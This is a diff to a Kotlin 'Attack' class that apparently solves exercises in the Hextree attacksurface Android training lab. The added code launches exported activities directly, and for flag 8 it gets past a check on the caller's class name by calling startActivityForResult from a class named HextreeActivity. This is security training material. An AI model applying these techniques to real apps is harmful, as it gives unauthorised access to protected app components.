@@ -13,10 +13,16 @@ import androidx.core.net.toUri
  * Techniques used to exploit exported activities of target app.
  */
 
-class Attack(private val context: Context) {
+class Attack(private val context: Context, private val activity: HextreeActivity) {
 
 	private val packageName = "io.hextree.attacksurface"
 
+	/**
+	 * FLAG 1 - Direct Activity Launch
+	 * Technique: Explicit Intent
+	 * Simply launch an exported activity directly using setClassName().
+	 * Works when activity has android:exported="true" with no extra conditions.
+	 */
 	fun flag1() {
 		val activityPath = "io.hextree.attacksurface.activities.Flag1Activity"
 
@@ -190,5 +196,25 @@ class Attack(private val context: Context) {
 			}
 			context.startActivity(newIntent)
 		}, 500)
+	}
+
+	/**
+	 * FLAG 8 - Caller Identity Verification Bypass
+	 * Technique: startActivityForResult + Caller Class Name Spoofing
+	 * Target activity uses getCallingActivity() to verify the caller's class name.
+	 * getCallingActivity() only returns a value when started via startActivityForResult().
+	 * It checks if caller class name contains "Hextree" before calling success().
+	 * We use HextreeActivity (which contains "Hextree" in name) to call startActivityForResult()
+	 * so getCallingActivity() returns "HextreeActivity" → condition passes → success().
+	 */
+	fun flag8() {
+		val activityPath = "$packageName.activities.Flag8Activity"
+
+		// Launch Flag8 via startActivityForResult from HextreeActivity
+		// so getCallingActivity() = "HextreeActivity" contains "Hextree"
+		val intent = Intent().apply {
+			setClassName(packageName, activityPath)
+		}
+		activity.startActivityForResult(intent, 8)
 	}
 }
